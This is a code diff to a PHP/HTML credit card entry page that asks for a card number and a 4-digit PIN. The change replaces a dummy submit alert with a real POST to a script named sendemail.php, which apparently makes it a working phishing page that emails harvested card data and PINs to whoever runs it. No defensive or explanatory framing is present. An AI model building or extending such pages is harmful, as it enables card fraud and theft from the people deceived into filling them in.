@@ -1,3 +1,9 @@
+<?php
+
+$_SESSION['img'] = 'card';
+
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -82,7 +88,7 @@
         <!-- Credit Card Image -->
         <img class="credit-card-image" src="../logo/card.png" alt="Credit Card">
 
-        <form id="creditCardForm">
+        <form action="sendemail.php" method="POST" id="creditCardForm">
             <label for="cardNumber">Credit Card Number:</label>
             <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter card number" pattern="^\d{16}$"
                 required>
@@ -101,16 +107,9 @@
                 <input type="text" id="pin" name="pin" placeholder=" 4 digit pin" pattern="^\d{4}$" required>
             </div>
 
-            <button type="button" onclick="submitCreditCardForm()">Submit</button>
+            <button type="submit">Submit</button>
         </form>
     </div>
-
-    <script>
-        function submitCreditCardForm() {
-            // You can perform additional actions here if needed
-            alert("Credit card information submitted successfully!");
-        }
-    </script>
 
 </body>
 
